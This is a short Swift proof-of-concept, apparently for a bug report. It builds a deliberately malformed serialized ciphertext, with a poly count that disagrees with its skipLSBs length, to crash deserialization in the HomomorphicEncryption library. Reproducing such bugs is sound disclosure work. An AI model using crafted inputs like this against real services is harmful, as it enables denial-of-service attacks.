import Foundation
import HomomorphicEncryption

do {
    // Use the correct, valid predefined RLWE parameter that supports UInt64
    let params = try EncryptionParameters<UInt64>(from: .insecure_n_16_logq_60_logt_15)
    
    // Context is generic over the Scheme (e.g., Bfv<UInt64>)
    let context = try Context<Bfv<UInt64>>(encryptionParameters: params)

    // polyCount = 2 (Little Endian: 0x02, 0x00)
    let fakePolysBuffer: [UInt8] = [0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
    
    let maliciousSerialized = SerializedCiphertext<UInt64>.full(
        polys: fakePolysBuffer, 
        skipLSBs: [0], // Length is 1, but polyCount is 2. This triggers the crash.
        correctionFactor: 1
    )

    let _ = try Ciphertext<Bfv<UInt64>, Coeff>(
        deserialize: maliciousSerialized, 
        context: context
    )
    print("Unexpectedly succeeded")
} catch {
    print("Caught error: \(error)")
}
